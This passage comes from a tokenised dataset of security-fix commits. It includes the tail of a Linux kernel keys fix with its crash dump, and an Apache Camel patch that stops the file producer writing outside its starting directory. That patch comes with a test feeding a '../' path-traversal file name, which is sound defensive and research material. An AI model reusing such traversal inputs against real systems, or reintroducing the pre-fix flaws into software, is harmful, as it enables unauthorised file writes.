"0000000000000000", "RDX:", "0000000000000005", "RSI:", "ffff8a467a275b14", "RDI:", "ffffffffb742f303", "RBP:", "ffffb15c40773e20", "R08:", "0000000000000000", "R09:", "ffff8a467a275b17", "R10:", "0000000000000020", "R11:", "0000000000000000", "R12:", "0000000000000000", "R13:", "0000000000000000", "R14:", "ffff8a4677057180", "R15:", "ffff8a467a275b0f", "FS:", "00007f5d7fb08700(0000)", "GS:ffff8a467f200000(0000)", "knlGS:0000000000000000", "CS:", "0010", "DS:", "0000", "ES:", "0000", "CR0:", "0000000080050033", "CR2:", "0000000000000018", "CR3:", "0000000077262005", "CR4:", "00000000001606f0", "Call", "Trace:", "key_create_or_update+0x2bc/0x460", "SyS_add_key+0x10c/0x1d0", "entry_SYSCALL_64_fastpath+0x1f/0xbe", "RIP:", "0033:0x7f5d7f211259", "RSP:", "002b:00007ffed03904c8", "EFLAGS:", "00000246", "ORIG_RAX:", "00000000000000f8", "RAX:", "ffffffffffffffda", "RBX:", "000000003b2a7955", "RCX:", "00007f5d7f211259", "RDX:", "00000000004009e4", "RSI:", "00000000004009ff", "RDI:", "0000000000400a04", "RBP:", "0000000068db8bad", "R08:", "000000003b2a7955", "R09:", "0000000000000004", "R10:", "000000000000001a", "R11:", "0000000000000246", "R12:", "0000000000400868", "R13:", "00007ffed03905d0", "R14:", "0000000000000000", "R15:", "0000000000000000", "Code:", "77", "28", "e8", "64", "34", "1f", "00", "45", "31", "c0", "31", "c9", "48", "8d", "55", "c8", "48", "89", "df", "48", "8d", "75", "d0", "e8", "ff", "f9", "ff", "ff", "85", "c0", "41", "89", "c4", "0f", "88", "84", "00", "00", "00", "4c", "8b", "7d", "c8", "<49>", "8b", "75", "18", "4c", "89", "ff", "e8", "24", "f8", "ff", "ff", "85", "c0", "41", "89", "c4", "78", "6d", "49", "8b", "RIP:", "encrypted_update+0xb0/0x170", "RSP:", "ffffb15c40773de8", "CR2:", "0000000000000018", "Cc:", "<stable@vger.kernel.org>", "#", "v2.6.12+", "Reported-by:", "Eric", "Biggers", "<ebiggers@google.com>", "Signed-off-by:", "David", "Howells", "<dhowells@redhat.com>", "cc:", "Eric", "Biggers", "<ebiggers@google.com>"], "code_tokens": ["@", "@", "-", "945", ",", "6", "+", "945", ",", "16", "@", "@", "key_ref_t", "key_create_or_update", "(", "key_ref_t", "keyring_ref", ",", "*", "/", "__key_link_end", "(", "keyring", ",", "&", "index_key", ",", "edit", ")", ";", "key", "=", "key_ref_to_ptr", "(", "key_ref", ")", ";", "if", "(", "test_bit", "(", "KEY_FLAG_USER_CONSTRUCT", ",", "&", "key", "-", ">", "flags", ")", ")", "{", "ret", "=", "wait_for_key_construction", "(", "key", ",", "true", ")", ";", "if", "(", "ret", "<", "0", ")", "{", "key_ref_put", "(", "key_ref", ")", ";", "key_ref", "=", "ERR_PTR", "(", "ret", ")", ";", "goto", "error_free_prep", ";", "}", "}", "key_ref", "=", "__key_update", "(", "key_ref", ",", "&", "prep", ")", ";", "goto", "error_free_prep", ";", "}"], "docstring_tokens": ["pointer", "dereference"]}
{"contents": ["CAMEL-13042:", "File", "producer", "should", "by", "default", "only", "allow", "to", "write", "file\u2026", "(#2700)", "*", "CAMEL-13042:", "File", "producer", "should", "by", "default", "only", "allow", "to", "write", "files", "in", "the", "starting", "directory", "(or", "subs).", "Added", "new", "option", "to", "turn", "this", "on|off.", "*", "CAMEL-13042:", "Regen", "docs", "*", "CAMEL-13042:", "Polished"], "code_tokens": ["@", "@", "-", "72", ",", "7", "+", "72", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "86", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "87", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "102", ",", "6", "+", "102", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "*", "startingDirectoryMustExist", "*", "(", "consumer", ")", "|", "Whether", "the", "starting", "directory", "must", "exist", ".", "Mind", "that", "the", "autoCreate", "option", "is", "default", "enabled", ",", "which", "means", "the", "starting", "directory", "is", "normally", "auto", "created", "if", "it", "doesn", "'", "t", "exist", ".", "You", "can", "disable", "autoCreate", "and", "enable", "this", "to", "ensure", "the", "starting", "directory", "must", "exist", ".", "Will", "thrown", "an", "exception", "if", "the", "directory", "doesn", "'", "t", "exist", ".", "|", "false", "|", "boolean", "|", "*", "fileExist", "*", "(", "producer", ")", "|", "What", "to", "do", "if", "a", "file", "already", "exists", "with", "the", "same", "name", ".", "Override", ",", "which", "is", "the", "default", ",", "replaces", "the", "existing", "file", ".", "Append", "-", "adds", "content", "to", "the", "existing", "file", ".", "Fail", "-", "throws", "a", "GenericFileOperationException", ",", "indicating", "that", "there", "is", "already", "an", "existing", "file", ".", "Ignore", "-", "silently", "ignores", "the", "problem", "and", "does", "not", "override", "the", "existing", "file", ",", "but", "assumes", "everything", "is", "okay", ".", "Move", "-", "option", "requires", "to", "use", "the", "moveExisting", "option", "to", "be", "configured", "as", "well", ".", "The", "option", "eagerDeleteTargetFile", "can", "be", "used", "to", "control", "what", "to", "do", "if", "an", "moving", "the", "file", ",", "and", "there", "exists", "already", "an", "existing", "file", ",", "otherwise", "causing", "the", "move", "operation", "to", "fail", ".", "The", "Move", "option", "will", "move", "any", "existing", "files", ",", "before", "writing", "the", "target", "file", ".", "TryRename", "is", "only", "applicable", "if", "tempFileName", "option", "is", "in", "use", ".", "This", "allows", "to", "try", "renaming", "the", "file", "from", "the", "temporary", "name", "to", "the", "actual", "name", ",", "without", "doing", "any", "exists", "check", ".", "This", "check", "may", "be", "faster", "on", "some", "file", "systems", "and", "especially", "FTP", "servers", ".", "|", "Override", "|", "GenericFileExist", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "moveExisting", "*", "(", "producer", ")", "|", "Expression", "(", "such", "as", "File", "Language", ")", "used", "to", "compute", "file", "name", "to", "use", "when", "fileExist", "=", "Move", "is", "configured", ".", "To", "move", "files", "into", "a", "backup", "subdirectory", "just", "enter", "backup", ".", "This", "option", "only", "supports", "the", "following", "File", "Language", "tokens", ":", "file", ":", "name", ",", "file", ":", "name", ".", "ext", ",", "file", ":", "name", ".", "noext", ",", "file", ":", "onlyname", ",", "file", ":", "onlyname", ".", "noext", ",", "file", ":", "ext", ",", "and", "file", ":", "parent", ".", "Notice", "the", "file", ":", "parent", "is", "not", "supported", "by", "the", "FTP", "component", ",", "as", "the", "FTP", "component", "can", "only", "move", "any", "existing", "files", "to", "a", "relative", "directory", "based", "on", "current", "dir", "as", "base", ".", "|", "|", "String", "|", "*", "tempFileName", "*", "(", "producer", ")", "|", "The", "same", "as", "tempPrefix", "option", "but", "offering", "a", "more", "fine", "grained", "control", "on", "the", "naming", "of", "the", "temporary", "filename", "as", "it", "uses", "the", "File", "Language", ".", "|", "|", "String", "|", "*", "tempPrefix", "*", "(", "producer", ")", "|", "This", "option", "is", "used", "to", "write", "the", "file", "using", "a", "temporary", "name", "and", "then", ",", "after", "the", "write", "is", "complete", ",", "rename", "it", "to", "the", "real", "name", ".", "Can", "be", "used", "to", "identify", "files", "being", "written", "and", "also", "avoid", "consumers", "(", "not", "using", "exclusive", "read", "locks", ")", "reading", "in", "progress", "files", ".", "Is", "often", "used", "by", "FTP", "when", "uploading", "big", "files", ".", "|", "|", "String", "@", "@", "-", "94", ",", "6", "+", "94", ",", "8", "@", "@", "protected", "boolean", "keepLastModified", ";", "@", "UriParam", "(", "label", "=", "\"", "producer", ",", "advanced", "\"", ")", "protected", "boolean", "allowNullBody", ";", "@", "UriParam", "(", "label", "=", "\"", "producer", "\"", ",", "defaultValue", "=", "\"", "true", "\"", ")", "protected", "boolean", "jailStartingDirectory", "=", "true", ";", "/", "/", "consumer", "options", "@", "@", "-", "1251", ",", "6", "+", "1253", ",", "19", "@", "@", "public", "void", "setAllowNullBody", "(", "boolean", "allowNullBody", ")", "{", "this", ".", "allowNullBody", "=", "allowNullBody", ";", "}", "public", "boolean", "isJailStartingDirectory", "(", ")", "{", "return", "jailStartingDirectory", ";", "}", "/", "**", "*", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "*", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "*", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "*", "/", "public", "void", "setJailStartingDirectory", "(", "boolean", "jailStartingDirectory", ")", "{", "this", ".", "jailStartingDirectory", "=", "jailStartingDirectory", ";", "}", "public", "ExceptionHandler", "getOnCompletionExceptionHandler", "(", ")", "{", "return", "onCompletionExceptionHandler", ";", "}", "@", "@", "-", "22", ",", "6", "+", "22", ",", "7", "@", "@", "import", "java", ".", "util", ".", "concurrent", ".", "locks", ".", "Lock", ";", "import", "java", ".", "util", ".", "concurrent", ".", "locks", ".", "ReentrantLock", ";", "import", "org", ".", "apache", ".", "camel", ".", "CamelExchangeException", ";", "import", "org", ".", "apache", ".", "camel", ".", "Exchange", ";", "import", "org", ".", "apache", ".", "camel", ".", "Expression", ";", "import", "org", ".", "apache", ".", "camel", ".", "support", ".", "DefaultExchange", ";", "@", "@", "-", "325", ",", "7", "+", "326", ",", "7", "@", "@", "public", "String", "createFileName", "(", "Exchange", "exchange", ")", "{", "exchange", ".", "getIn", "(", ").", "setHeader", "(", "Exchange", ".", "FILE_NAME", ",", "value", ")", ";", "}", "if", "(", "value", "!", "=", "null", "&", "&", "value", "instanceof", "String", "&", "&", "StringHelper", ".", "hasStartToken", "(", "(", "String", ")", "value", ",", "\"", "simple", "\"", "))", "{", "if", "(", "value", "instanceof", "String", "&", "&", "StringHelper", ".", "hasStartToken", "(", "(", "String", ")", "value", ",", "\"", "simple", "\"", "))", "{", "log", ".", "warn", "(", "\"", "Simple", "expression", ":", "{", "}", "detected", "in", "header", ":", "{", "}", "of", "type", "String", ".", "This", "feature", "has", "been", "removed", "(", "see", "CAMEL", "-", "6748", ")", ".\"", ",", "value", ",", "Exchange", ".", "FILE_NAME", ")", ";", "}", "@", "@", "-", "372", ",", "6", "+", "373", ",", "15", "@", "@", "public", "String", "createFileName", "(", "Exchange", "exchange", ")", "{", "answer", "=", "baseDir", "+", "endpoint", ".", "getGeneratedFileName", "(", "exchange", ".", "getIn", "(", "))", ";", "}", "if", "(", "endpoint", ".", "isJailStartingDirectory", "(", "))", "{", "/", "/", "check", "for", "file", "must", "be", "within", "starting", "directory", "(", "need", "to", "compact", "first", "as", "the", "name", "can", "be", "using", "relative", "paths", "via", ".", "./", "etc", ")", "String", "compatchAnswer", "=", "FileUtil", ".", "compactPath", "(", "answer", ")", ";", "String", "compatchBaseDir", "=", "FileUtil", ".", "compactPath", "(", "baseDir", ")", ";", "if", "(", "!", "compatchAnswer", ".", "startsWith", "(", "compatchBaseDir", ")", ")", "{", "throw", "new", "IllegalArgumentException", "(", "\"", "Cannot", "write", "file", "with", "name", ":", "\"", "+", "compatchAnswer", "+", "\"", "as", "the", "filename", "is", "jailed", "to", "the", "starting", "directory", ":", "\"", "+", "compatchBaseDir", ")", ";", "}", "}", "if", "(", "endpoint", ".", "getConfiguration", "(", ").", "needToNormalize", "(", "))", "{", "/", "/", "must", "normalize", "path", "to", "cater", "for", "Windows", "and", "other", "OS", "answer", "=", "normalizePath", "(", "answer", ")", ";", "@", "@", "-", "81", ",", "7", "+", "81", ",", "7", "@", "@", "public", "void", "testProducerDateByExpression", "(", ")", "throws", "Exception", "{", "@", "Test", "public", "void", "testProducerComplexByExpression", "(", ")", "throws", "Exception", "{", "String", "expression", "=", "\"", "..", "/", "filelanguageinbox", "/", "myfile", "-", "${", "bean", ":", "myguidgenerator", ".", "guid", "}", "-$", "{", "date", ":", "now", ":", "yyyyMMdd", "}", ".", "txt", "\"", ";", "template", ".", "sendBody", "(", "\"", "file", ":", "//", "target", "/", "filelanguage", "?", "fileName", "=", "\"", "+", "expression", ",", "\"", "Hello", "World", "\"", ");", "template", ".", "sendBody", "(", "\"", "file", ":", "//", "target", "/", "filelanguage", "?", "jailStartingDirectory", "=", "false", "&", "fileName", "=", "\"", "+", "expression", ",", "\"", "Hello", "World", "\"", ");", "String", "date", "=", "new", "SimpleDateFormat", "(", "\"", "yyyyMMdd", "\"", ").", "format", "(", "new", "Date", "(", "))", ";", "assertFileExists", "(", "\"", "target", "/", "filelanguageinbox", "/", "myfile", "-", "123", "-", "\"", "+", "date", "+", "\"", ".", "txt", "\"", ");", "@", "@", "-", "0", ",", "0", "+", "1", ",", "73", "@", "@", "/", "**", "*", "Licensed", "to", "the", "Apache", "Software", "Foundation", "(", "ASF", ")", "under", "one", "or", "more", "*", "contributor", "license", "agreements", ".", "See", "the", "NOTICE", "file", "distributed", "with", "*", "this", "work", "for", "additional", "information", "regarding", "copyright", "ownership", ".", "*", "The", "ASF", "licenses", "this", "file", "to", "You", "under", "the", "Apache", "License", ",", "Version", "2", ".", "0", "*", "(", "the", "\"", "License", "\"", ");", "you", "may", "not", "use", "this", "file", "except", "in", "compliance", "with", "*", "the", "License", ".", "You", "may", "obtain", "a", "copy", "of", "the", "License", "at", "*", "*", "http", ":", "//", "www", ".", "apache", ".", "org", "/", "licenses", "/", "LICENSE", "-", "2", ".", "0", "*", "*", "Unless", "required", "by", "applicable", "law", "or", "agreed", "to", "in", "writing", ",", "software", "*", "distributed", "under", "the", "License", "is", "distributed", "on", "an", "\"", "AS", "IS", "\"", "BASIS", ",", "*", "WITHOUT", "WARRANTIES", "OR", "CONDITIONS", "OF", "ANY", "KIND", ",", "either", "express", "or", "implied", ".", "*", "See", "the", "License", "for", "the", "specific", "language", "governing", "permissions", "and", "*", "limitations", "under", "the", "License", ".", "*", "/", "package", "org", ".", "apache", ".", "camel", ".", "component", ".", "file", ";", "import", "org", ".", "apache", ".", "camel", ".", "ContextTestSupport", ";", "import", "org", ".", "apache", ".", "camel", ".", "Exchange", ";", "import", "org", ".", "apache", ".", "camel", ".", "builder", ".", "RouteBuilder", ";", "import", "org", ".", "apache", ".", "camel", ".", "component", ".", "mock", ".", "MockEndpoint", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "public", "class", "FileProducerJailStartingDirectoryTest", "extends", "ContextTestSupport", "{", "@", "Override", "@", "Before", "public", "void", "setUp", "(", ")", "throws", "Exception", "{", "deleteDirectory", "(", "\"", "target", "/", "jail", "\"", ");", "super", ".", "setUp", "(", ");", "}", "@", "Test", "public", "void", "testWriteOutsideStartingDirectory", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "result", "\"", ");", "mock", ".", "expectedMessageCount", "(", "0", ")", ";", "try", "{", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "start", "\"", ",", "\"", "Hello", "World", "\"", ",", "Exchange", ".", "FILE_NAME", ",", "\"", "hello", ".", "txt", "\"", ");", "fail", "(", "\"", "Should", "have", "thrown", "exception", "\"", ");", "}", "catch", "(", "Exception", "e", ")", "{", "IllegalArgumentException", "iae", "=", "assertIsInstanceOf", "(", "IllegalArgumentException", ".", "class", ",", "e", ".", "getCause", "(", "))", ";", "assertTrue", "(", "iae", ".", "getMessage", "(", ").", "contains", "(", "\"", "as", "the", "filename", "is", "jailed", "to", "the", "starting", "directory", "\"", "))", ";", "}", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Test", "public", "void", "testWriteInsideStartingDirectory", "(", ")", "throws", "Exception", "{", "MockEndpoint", "mock", "=", "getMockEndpoint", "(", "\"", "mock", ":", "result", "\"", ");", "mock", ".", "expectedMessageCount", "(", "1", ")", ";", "template", ".", "sendBodyAndHeader", "(", "\"", "direct", ":", "start", "\"", ",", "\"", "Bye", "World", "\"", ",", "Exchange", ".", "FILE_NAME", ",", "\"", "outbox", "/", "bye", ".", "txt", "\"", ");", "assertMockEndpointsSatisfied", "(", ");", "}", "@", "Override", "protected", "RouteBuilder", "createRouteBuilder", "(", ")", "throws", "Exception", "{", "return", "new", "RouteBuilder", "(", ")", "{", "@", "Override", "public", "void", "configure", "(", ")", "throws", "Exception", "{", "from", "(", "\"", "direct", ":", "start", "\"", ")", ".", "setHeader", "(", "Exchange", ".", "FILE_NAME", ",", "simple", "(", "\".", "./", "${", "file", ":", "name", "}", "\")", ")", ".", "to", "(", "\"", "file", ":", "target", "/", "jail", "/", "outbox", "\"", ")", ".", "to", "(", "\"", "mock", ":", "result", "\"", ");", "}", "}", ";", "}", "}", "@", "@", "-", "100", ",", "7", "+", "100", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "109", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "110", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "143", ",", "6", "+", "143", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "*", "useList", "*", "(", "consumer", ")", "|", "Whether", "to", "allow", "using", "LIST", "command", "when", "downloading", "a", "file", ".", "Default", "is", "true", ".", "In", "some", "use", "cases", "you", "may", "want", "to", "download", "a", "specific", "file", "and", "are", "not", "allowed", "to", "use", "the", "LIST", "command", ",", "and", "therefore", "you", "can", "set", "this", "option", "to", "false", ".", "Notice", "when", "using", "this", "option", ",", "then", "the", "specific", "file", "to", "download", "does", "not", "include", "meta", "-", "data", "information", "such", "as", "file", "size", ",", "timestamp", ",", "permissions", "etc", ",", "because", "those", "information", "is", "only", "possible", "to", "retrieve", "when", "LIST", "command", "is", "in", "use", ".", "|", "true", "|", "boolean", "|", "*", "fileExist", "*", "(", "producer", ")", "|", "What", "to", "do", "if", "a", "file", "already", "exists", "with", "the", "same", "name", ".", "Override", ",", "which", "is", "the", "default", ",", "replaces", "the", "existing", "file", ".", "Append", "-", "adds", "content", "to", "the", "existing", "file", ".", "Fail", "-", "throws", "a", "GenericFileOperationException", ",", "indicating", "that", "there", "is", "already", "an", "existing", "file", ".", "Ignore", "-", "silently", "ignores", "the", "problem", "and", "does", "not", "override", "the", "existing", "file", ",", "but", "assumes", "everything", "is", "okay", ".", "Move", "-", "option", "requires", "to", "use", "the", "moveExisting", "option", "to", "be", "configured", "as", "well", ".", "The", "option", "eagerDeleteTargetFile", "can", "be", "used", "to", "control", "what", "to", "do", "if", "an", "moving", "the", "file", ",", "and", "there", "exists", "already", "an", "existing", "file", ",", "otherwise", "causing", "the", "move", "operation", "to", "fail", ".", "The", "Move", "option", "will", "move", "any", "existing", "files", ",", "before", "writing", "the", "target", "file", ".", "TryRename", "is", "only", "applicable", "if", "tempFileName", "option", "is", "in", "use", ".", "This", "allows", "to", "try", "renaming", "the", "file", "from", "the", "temporary", "name", "to", "the", "actual", "name", ",", "without", "doing", "any", "exists", "check", ".", "This", "check", "may", "be", "faster", "on", "some", "file", "systems", "and", "especially", "FTP", "servers", ".", "|", "Override", "|", "GenericFileExist", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "moveExisting", "*", "(", "producer", ")", "|", "Expression", "(", "such", "as", "File", "Language", ")", "used", "to", "compute", "file", "name", "to", "use", "when", "fileExist", "=", "Move", "is", "configured", ".", "To", "move", "files", "into", "a", "backup", "subdirectory", "just", "enter", "backup", ".", "This", "option", "only", "supports", "the", "following", "File", "Language", "tokens", ":", "file", ":", "name", ",", "file", ":", "name", ".", "ext", ",", "file", ":", "name", ".", "noext", ",", "file", ":", "onlyname", ",", "file", ":", "onlyname", ".", "noext", ",", "file", ":", "ext", ",", "and", "file", ":", "parent", ".", "Notice", "the", "file", ":", "parent", "is", "not", "supported", "by", "the", "FTP", "component", ",", "as", "the", "FTP", "component", "can", "only", "move", "any", "existing", "files", "to", "a", "relative", "directory", "based", "on", "current", "dir", "as", "base", ".", "|", "|", "String", "|", "*", "tempFileName", "*", "(", "producer", ")", "|", "The", "same", "as", "tempPrefix", "option", "but", "offering", "a", "more", "fine", "grained", "control", "on", "the", "naming", "of", "the", "temporary", "filename", "as", "it", "uses", "the", "File", "Language", ".", "|", "|", "String", "|", "*", "tempPrefix", "*", "(", "producer", ")", "|", "This", "option", "is", "used", "to", "write", "the", "file", "using", "a", "temporary", "name", "and", "then", ",", "after", "the", "write", "is", "complete", ",", "rename", "it", "to", "the", "real", "name", ".", "Can", "be", "used", "to", "identify", "files", "being", "written", "and", "also", "avoid", "consumers", "(", "not", "using", "exclusive", "read", "locks", ")", "reading", "in", "progress", "files", ".", "Is", "often", "used", "by", "FTP", "when", "uploading", "big", "files", ".", "|", "|", "String", "@", "@", "-", "60", ",", "7", "+", "60", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "121", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "122", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "103", ",", "6", "+", "103", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "*", "useList", "*", "(", "consumer", ")", "|", "Whether", "to", "allow", "using", "LIST", "command", "when", "downloading", "a", "file", ".", "Default", "is", "true", ".", "In", "some", "use", "cases", "you", "may", "want", "to", "download", "a", "specific", "file", "and", "are", "not", "allowed", "to", "use", "the", "LIST", "command", ",", "and", "therefore", "you", "can", "set", "this", "option", "to", "false", ".", "Notice", "when", "using", "this", "option", ",", "then", "the", "specific", "file", "to", "download", "does", "not", "include", "meta", "-", "data", "information", "such", "as", "file", "size", ",", "timestamp", ",", "permissions", "etc", ",", "because", "those", "information", "is", "only", "possible", "to", "retrieve", "when", "LIST", "command", "is", "in", "use", ".", "|", "true", "|", "boolean", "|", "*", "fileExist", "*", "(", "producer", ")", "|", "What", "to", "do", "if", "a", "file", "already", "exists", "with", "the", "same", "name", ".", "Override", ",", "which", "is", "the", "default", ",", "replaces", "the", "existing", "file", ".", "Append", "-", "adds", "content", "to", "the", "existing", "file", ".", "Fail", "-", "throws", "a", "GenericFileOperationException", ",", "indicating", "that", "there", "is", "already", "an", "existing", "file", ".", "Ignore", "-", "silently", "ignores", "the", "problem", "and", "does", "not", "override", "the", "existing", "file", ",", "but", "assumes", "everything", "is", "okay", ".", "Move", "-", "option", "requires", "to", "use", "the", "moveExisting", "option", "to", "be", "configured", "as", "well", ".", "The", "option", "eagerDeleteTargetFile", "can", "be", "used", "to", "control", "what", "to", "do", "if", "an", "moving", "the", "file", ",", "and", "there", "exists", "already", "an", "existing", "file", ",", "otherwise", "causing", "the", "move", "operation", "to", "fail", ".", "The", "Move", "option", "will", "move", "any", "existing", "files", ",", "before", "writing", "the", "target", "file", ".", "TryRename", "is", "only", "applicable", "if", "tempFileName", "option", "is", "in", "use", ".", "This", "allows", "to", "try", "renaming", "the", "file", "from", "the", "temporary", "name", "to", "the", "actual", "name", ",", "without", "doing", "any", "exists", "check", ".", "This", "check", "may", "be", "faster", "on", "some", "file", "systems", "and", "especially", "FTP", "servers", ".", "|", "Override", "|", "GenericFileExist", "|", "*", "flatten", "*", "(", "producer", ")", "|", "Flatten", "is", "used", "to", "flatten", "the", "file", "name", "path", "to", "strip", "any", "leading", "paths", ",", "so", "it", "'", "s", "just", "the", "file", "name", ".", "This", "allows", "you", "to", "consume", "recursively", "into", "sub", "-", "directories", ",", "but", "when", "you", "eg", "write", "the", "files", "to", "another", "directory", "they", "will", "be", "written", "in", "a", "single", "directory", ".", "Setting", "this", "to", "true", "on", "the", "producer", "enforces", "that", "any", "file", "name", "in", "CamelFileName", "header", "will", "be", "stripped", "for", "any", "leading", "paths", ".", "|", "false", "|", "boolean", "|", "*", "jailStartingDirectory", "*", "(", "producer", ")", "|", "Used", "for", "jailing", "(", "restricting", ")", "writing", "files", "to", "the", "starting", "directory", "(", "and", "sub", ")", "only", ".", "This", "is", "enabled", "by", "default", "to", "not", "allow", "Camel", "to", "write", "files", "to", "outside", "directories", "(", "to", "be", "more", "secured", "out", "of", "the", "box", ")", ".", "You", "can", "turn", "this", "off", "to", "allow", "writing", "files", "to", "directories", "outside", "the", "starting", "directory", ",", "such", "as", "parent", "or", "root", "folders", ".", "|", "true", "|", "boolean", "|", "*", "moveExisting", "*", "(", "producer", ")", "|", "Expression", "(", "such", "as", "File", "Language", ")", "used", "to", "compute", "file", "name", "to", "use", "when", "fileExist", "=", "Move", "is", "configured", ".", "To", "move", "files", "into", "a", "backup", "subdirectory", "just", "enter", "backup", ".", "This", "option", "only", "supports", "the", "following", "File", "Language", "tokens", ":", "file", ":", "name", ",", "file", ":", "name", ".", "ext", ",", "file", ":", "name", ".", "noext", ",", "file", ":", "onlyname", ",", "file", ":", "onlyname", ".", "noext", ",", "file", ":", "ext", ",", "and", "file", ":", "parent", ".", "Notice", "the", "file", ":", "parent", "is", "not", "supported", "by", "the", "FTP", "component", ",", "as", "the", "FTP", "component", "can", "only", "move", "any", "existing", "files", "to", "a", "relative", "directory", "based", "on", "current", "dir", "as", "base", ".", "|", "|", "String", "|", "*", "tempFileName", "*", "(", "producer", ")", "|", "The", "same", "as", "tempPrefix", "option", "but", "offering", "a", "more", "fine", "grained", "control", "on", "the", "naming", "of", "the", "temporary", "filename", "as", "it", "uses", "the", "File", "Language", ".", "|", "|", "String", "|", "*", "tempPrefix", "*", "(", "producer", ")", "|", "This", "option", "is", "used", "to", "write", "the", "file", "using", "a", "temporary", "name", "and", "then", ",", "after", "the", "write", "is", "complete", ",", "rename", "it", "to", "the", "real", "name", ".", "Can", "be", "used", "to", "identify", "files", "being", "written", "and", "also", "avoid", "consumers", "(", "not", "using", "exclusive", "read", "locks", ")", "reading", "in", "progress", "files", ".", "Is", "often", "used", "by", "FTP", "when", "uploading", "big", "files", ".", "|", "|", "String", "@", "@", "-", "51", ",", "7", "+", "51", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "==", "=", "=", "==", "=", "Query", "Parameters", "(", "117", "parameters", ")", ":", "=", "==", "=", "Query", "Parameters", "(", "118", "parameters", ")", ":", "[", "width", "=", "\"", "100", "%", "\",", "cols", "=", "\"", "2", ",", "5", ",", "^", "1", ",", "2", "\"", ",", "options", "=", "\"", "header", "\"", "]", "@", "@", "-", "87", ",", "6", "+", "87", ",", "7", "@", "@", "with", "the", "following", "path", "and", "query", "parameters", ":", "|", "*", "useList", "*", "(", "consumer", ")", "|", "Whether", "to", "allow", "using", "LIST", "command", "when", "downloading", "a", "file", ".", "Default", "is", "true", ".", "In", "some", "use", "cases", "you", "may", "want", "to", "download", "a", "specific", "file", "and", "are", "not", "allowed", "to", "use", "the", "LIST", "command", ",", "and", "therefore", "you", "can", "set", "this", "option", "to", "false", ".", "Notice", "when", "using", "this", "option", ",", "then", "the", "specific", "file", "to", "download", "does", "not", "include", "meta", "-", "data", "information", "such", "as", "file", "size", ",", "timestamp", ",", "permissions", "etc", ",", "because", "those", 